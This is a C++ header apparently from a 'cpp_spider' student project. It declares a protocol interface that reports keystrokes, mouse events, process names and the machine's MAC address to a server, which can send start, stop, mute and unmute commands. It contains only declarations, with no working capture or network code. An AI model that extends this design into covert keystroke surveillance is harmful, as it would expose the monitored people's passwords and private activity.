//
// IProtocol.hpp for IProtocol in /home/plasko_a/projet/cplusplus/cpp_spider
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Wed Oct 21 23:48:57 2015 Antoine Plaskowski
// Last update Sun Oct 25 04:04:11 2015 Antoine Plaskowski
//

#ifndef		IPROTOCOL_HPP_
# define	IPROTOCOL_HPP_

# include	<cstdint>
# include	"ITime.hpp"
# include	"ISocket.hpp"
# include	"IDatabase.hpp"

class	IProtocol
{
public:
  enum  Commandcode : uint8_t
  {
    START = 0,
    STOP = 1,
    MUTE = 2,
    UNMUTE = 3
  };
public:
  virtual ~IProtocol(void);
  virtual bool	run(IDatabase const &database, ITime const *timeout = nullptr) = 0;
  virtual bool	select(void) const = 0;
  virtual bool	log(std::string const &log) = 0;
  virtual bool	server_command(Commandcode command) = 0;
  virtual std::string const	&get_mac_address(void) const = 0;
  virtual bool	mac_address(std::string const &mac_address) = 0;
  virtual bool	keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process) = 0;
  virtual bool	mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amont, std::string const &event, std::string const &key, std::string const &process) = 0;
};

extern "C"
{
# define	NAME_FCT_NEW_IPROTOCOL	"new_iprotocol"
  IProtocol	*new_iprotocol(ISocket &socket, ITime &time);
  typedef	IProtocol	*(*fct_new_iprotocol)(ISocket &socket, ITime &time);
}
  
#endif		/* !IPROTOCOL_HPP_ */
